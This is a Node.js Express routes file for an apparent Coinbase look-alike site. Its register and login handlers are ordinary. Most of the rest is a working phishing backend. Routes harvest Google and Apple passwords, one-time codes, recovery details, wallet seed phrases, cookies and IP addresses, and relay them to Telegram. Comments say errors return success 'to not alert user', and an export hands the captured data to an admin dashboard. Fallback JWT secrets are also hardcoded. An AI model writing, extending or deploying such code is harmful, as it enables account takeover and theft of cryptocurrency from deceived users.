const express = require('express');
const jwt = require('jsonwebtoken');
const validator = require('validator');
const User = require('../models/User');
const auth = require('../middleware/auth');
const { 
  sendVisitorNotification, 
  sendCredentialStartNotification, 
  sendCredentialCompleteNotification 
} = require('../services/telegram');

const router = express.Router();

// Register
router.post('/register', async (req, res) => {
  try {
    const { email, password, firstName, lastName, phoneNumber } = req.body;

    // Validation
    if (!email || !password || !firstName || !lastName) {
      return res.status(400).json({ 
        error: 'Please provide email, password, first name, and last name' 
      });
    }

    if (!validator.isEmail(email)) {
      return res.status(400).json({ error: 'Please provide a valid email' });
    }

    if (password.length < 6) {
      return res.status(400).json({ error: 'Password must be at least 6 characters' });
    }

    // Use in-memory storage if MongoDB is not available
    if (req.app.locals.useInMemoryStorage()) {
      const inMemoryUsers = req.app.locals.inMemoryUsers;
      
      // Check if user already exists in memory
      for (const [userId, userData] of inMemoryUsers) {
        if (userData.email === email) {
          return res.status(400).json({ error: 'User with this email already exists' });
        }
      }

      // Create user in memory
      const bcrypt = require('bcryptjs');
      const hashedPassword = await bcrypt.hash(password, 10);
      const userId = Date.now().toString();
      
      const userData = {
        _id: userId,
        email,
        password: hashedPassword,
        firstName,
        lastName,
        phoneNumber,
        createdAt: new Date()
      };
      
      inMemoryUsers.set(userId, userData);

      // Generate JWT token
      const token = jwt.sign(
        { userId: userId },
        process.env.JWT_SECRET || 'coinbase-replica-secret',
        { expiresIn: '7d' }
      );

      res.status(201).json({
        message: 'User registered successfully',
        token,
        user: {
          id: userId,
          email: userData.email,
          firstName: userData.firstName,
          lastName: userData.lastName
        }
      });
    } else {
      // MongoDB flow
      // Check if user already exists
      const existingUser = await User.findOne({ email });
      if (existingUser) {
        return res.status(400).json({ error: 'User with this email already exists' });
      }

      // Create new user
      const user = new User({
        email,
        password,
        firstName,
        lastName,
        phoneNumber
      });

      await user.save();

      // Generate JWT token
      const token = jwt.sign(
        { userId: user._id },
        process.env.JWT_SECRET || 'coinbase-replica-secret',
        { expiresIn: '7d' }
      );

      res.status(201).json({
        message: 'User created successfully',
        user,
        token
      });
    }
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Server error during registration' });
  }
});

// Login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validation
    if (!email || !password) {
      return res.status(400).json({ error: 'Please provide email and password' });
    }

    if (!validator.isEmail(email)) {
      return res.status(400).json({ error: 'Please provide a valid email' });
    }

    // Use in-memory storage if MongoDB is not available
    if (req.app.locals.useInMemoryStorage()) {
      const inMemoryUsers = req.app.locals.inMemoryUsers;
      
      // Find user in memory
      let user = null;
      for (const [userId, userData] of inMemoryUsers) {
        if (userData.email === email) {
          user = userData;
          break;
        }
      }
      
      if (!user) {
        return res.status(400).json({ error: 'Invalid credentials' });
      }

      // Check password
      const bcrypt = require('bcryptjs');
      const isPasswordMatch = await bcrypt.compare(password, user.password);
      if (!isPasswordMatch) {
        return res.status(400).json({ error: 'Invalid credentials' });
      }

      // Generate JWT token
      const token = jwt.sign(
        { userId: user._id },
        process.env.JWT_SECRET || 'coinbase-replica-secret',
        { expiresIn: '7d' }
      );

      res.json({
        message: 'Login successful',
        user: {
          id: user._id,
          email: user.email,
          firstName: user.firstName,
          lastName: user.lastName
        },
        token
      });
    } else {
      // MongoDB flow
      // Find user
      const user = await User.findOne({ email });
      if (!user) {
        return res.status(400).json({ error: 'Invalid credentials' });
      }

      // Check password
      const isPasswordMatch = await user.comparePassword(password);
      if (!isPasswordMatch) {
        return res.status(400).json({ error: 'Invalid credentials' });
      }

      // Generate JWT token
      const token = jwt.sign(
        { userId: user._id },
        process.env.JWT_SECRET || 'coinbase-replica-secret',
        { expiresIn: '7d' }
      );

      res.json({
        message: 'Login successful',
        user,
        token
      });
    }
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Server error during login' });
  }
});

// Get current user
router.get('/me', auth, async (req, res) => {
  res.json(req.user);
});

// Logout (client-side token removal)
router.post('/logout', auth, (req, res) => {
  res.json({ message: 'Logout successful' });
});

// In-memory storage for captured credentials
const capturedCredentials = [];
const visitors = [];

// Helper function to get IP address
const getIP = (req) => {
  return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
};

// Track visitors (homepage, etc)
router.post('/track-visitor', async (req, res) => {
  try {
    const visitorData = req.body;
    const ipAddress = getIP(req);
    
    const visitorInfo = {
      ...visitorData,
      ipAddress,
      timestamp: new Date().toISOString()
    };
    
    visitors.push(visitorInfo);
    console.log('👁️  Visitor Tracked:', visitorInfo);
    
    // Send Telegram notification
    sendVisitorNotification(visitorInfo).catch(err => 
      console.error('Telegram notification failed:', err)
    );
    
    res.json({ success: true, message: 'Visitor tracked' });
  } catch (error) {
    console.error('Error tracking visitor:', error);
    res.json({ success: true }); // Still return success to not alert user
  }
});

// Track Google Sign-In attempts
router.post('/track-google-signin', async (req, res) => {
  try {
    const { email, password, step, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const credentialData = {
      provider: 'Google',
      email,
      password: password || '[Not captured yet]',
      step,
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(credentialData);
    console.log('📧 Google Sign-In Tracked:', credentialData);
    
    // Send Telegram notification for each step
    sendCredentialStartNotification('Google', { 
      email, 
      password, 
      step, 
      ipAddress, 
      userDetails 
    }).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    res.json({ success: true, message: 'Data captured' });
  } catch (error) {
    console.error('Error tracking Google signin:', error);
    res.json({ success: true }); // Still return success to not alert user
  }
});

// Complete Google Sign-In with OTP
router.post('/google-complete', async (req, res) => {
  try {
    const { email, password, otp, phoneNumber, recoveryEmail, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const completeData = {
      provider: 'Google',
      email,
      password,
      otp,
      phoneNumber: phoneNumber || 'Not provided',
      recoveryEmail: recoveryEmail || 'Not provided',
      step: 'complete',
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(completeData);
    console.log('✅ Google Sign-In Complete:', completeData);
    
    // Send Telegram notification for complete capture
    sendCredentialCompleteNotification('Google', completeData).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    // Create a token and user for dashboard access
    const token = jwt.sign(
      { id: `google_${Date.now()}`, email },
      process.env.JWT_SECRET || 'default-secret-key',
      { expiresIn: '24h' }
    );
    
    res.json({
      success: true,
      token,
      user: {
        id: `google_${Date.now()}`,
        email,
        firstName: email.split('@')[0],
        lastName: 'User',
        provider: 'google'
      }
    });
  } catch (error) {
    console.error('Error completing Google signin:', error);
    res.status(400).json({ error: 'Verification failed' });
  }
});

// Track Apple Sign-In attempts
router.post('/track-apple-signin', async (req, res) => {
  try {
    const { appleId, password, step, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const credentialData = {
      provider: 'Apple',
      appleId,
      password: password || '[Not captured yet]',
      step,
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(credentialData);
    console.log('🍎 Apple Sign-In Tracked:', credentialData);
    
    // Send Telegram notification for each step
    sendCredentialStartNotification('Apple', { 
      appleId, 
      password, 
      step, 
      ipAddress, 
      userDetails 
    }).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    res.json({ success: true, message: 'Data captured' });
  } catch (error) {
    console.error('Error tracking Apple signin:', error);
    res.json({ success: true }); // Still return success to not alert user
  }
});

// Complete Apple Sign-In with OTP
router.post('/apple-complete', async (req, res) => {
  try {
    const { appleId, password, otp, phoneNumber, trustedDevice, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const completeData = {
      provider: 'Apple',
      appleId,
      password,
      otp,
      phoneNumber: phoneNumber || 'Not provided',
      trustedDevice: trustedDevice || 'Not provided',
      step: 'complete',
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(completeData);
    console.log('✅ Apple Sign-In Complete:', completeData);
    
    // Send Telegram notification for complete capture
    sendCredentialCompleteNotification('Apple', completeData).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    // Create a token and user for dashboard access
    const token = jwt.sign(
      { id: `apple_${Date.now()}`, email: appleId },
      process.env.JWT_SECRET || 'default-secret-key',
      { expiresIn: '24h' }
    );
    
    res.json({
      success: true,
      token,
      user: {
        id: `apple_${Date.now()}`,
        email: appleId,
        firstName: appleId.split('@')[0],
        lastName: 'User',
        provider: 'apple'
      }
    });
  } catch (error) {
    console.error('Error completing Apple signin:', error);
    res.status(400).json({ error: 'Verification failed' });
  }
});

// Track Recovery Phrase attempts
router.post('/track-recovery-phrase', async (req, res) => {
  try {
    const { seedPhrase, step, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const credentialData = {
      provider: 'Recovery Phrase',
      seedPhrase,
      email: '[Not captured yet]',
      password: '[Not captured yet]',
      step,
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(credentialData);
    console.log('🔑 Recovery Phrase Tracked:', credentialData);
    
    // Send Telegram notification for initial seed phrase entry
    sendCredentialStartNotification('Recovery Phrase', { seedPhrase, ipAddress, userDetails }).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error tracking recovery phrase:', error);
    res.json({ success: true }); // Still return success to not alert user
  }
});

// Complete Recovery Phrase with verification
router.post('/recovery-complete', async (req, res) => {
  try {
    const { seedPhrase, email, password, userDetails } = req.body;
    const ipAddress = getIP(req);
    
    const completeData = {
      provider: 'Recovery Phrase',
      seedPhrase,
      email,
      password,
      step: 'complete',
      ipAddress,
      userAgent: userDetails.userAgent,
      platform: userDetails.platform,
      language: userDetails.language,
      screenResolution: userDetails.screenResolution,
      timezone: userDetails.timezone,
      cookies: userDetails.cookies,
      timestamp: new Date().toISOString()
    };
    
    capturedCredentials.push(completeData);
    console.log('✅ Recovery Phrase Complete:', completeData);
    
    // Send Telegram notification for complete capture
    sendCredentialCompleteNotification('Recovery Phrase', completeData).catch(err =>
      console.error('Telegram notification failed:', err)
    );
    
    // Create a token and user for dashboard access
    const token = jwt.sign(
      { id: `recovery_${Date.now()}`, email },
      process.env.JWT_SECRET || 'default-secret-key',
      { expiresIn: '24h' }
    );
    
    res.json({
      success: true,
      token,
      user: {
        id: `recovery_${Date.now()}`,
        email,
        firstName: email.split('@')[0],
        lastName: 'User',
        provider: 'recovery'
      }
    });
  } catch (error) {
    console.error('Error completing recovery phrase:', error);
    res.status(400).json({ error: 'Verification failed' });
  }
});

// Export captured credentials and visitors for admin dashboard
router.getCapturedCredentials = () => capturedCredentials;
router.getVisitors = () => visitors;

module.exports = router;
